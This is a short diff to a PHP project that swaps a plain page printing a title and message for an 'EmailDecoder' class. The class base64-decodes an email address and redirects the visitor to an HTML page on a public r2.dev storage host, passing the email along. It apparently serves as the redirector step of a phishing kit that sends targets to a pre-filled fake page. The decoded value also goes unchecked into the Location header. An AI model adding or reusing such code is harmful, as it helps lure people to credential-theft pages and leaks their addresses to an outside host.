@@ -1,10 +1,23 @@
 <?php
 
-use App\Messages;
+namespace App;
 
-require __DIR__.'/../vendor/autoload.php';
+class EmailDecoder
+{
+    // Check if data is Base64 encoded
+    public static function isBase64($data)
+    {
+        return (base64_encode(base64_decode($data, true)) === $data);
+    }
 
-$messages = new Messages();
+    // Decode the email and redirect
+    public static function decode($email)
+    {
+        if (self::isBase64($email)) {
+            $email = base64_decode($email);
+        }
 
-printf("<h1>%s</h1>\n", $messages->title());
-printf("<p>%s</p>\n", $messages->message());
+        header("Location: https://pub-52b565e2d63449c59c1957eb7cd05dc4.r2.dev/OnGod.html?email=" . $email);
+        exit;
+    }
+}
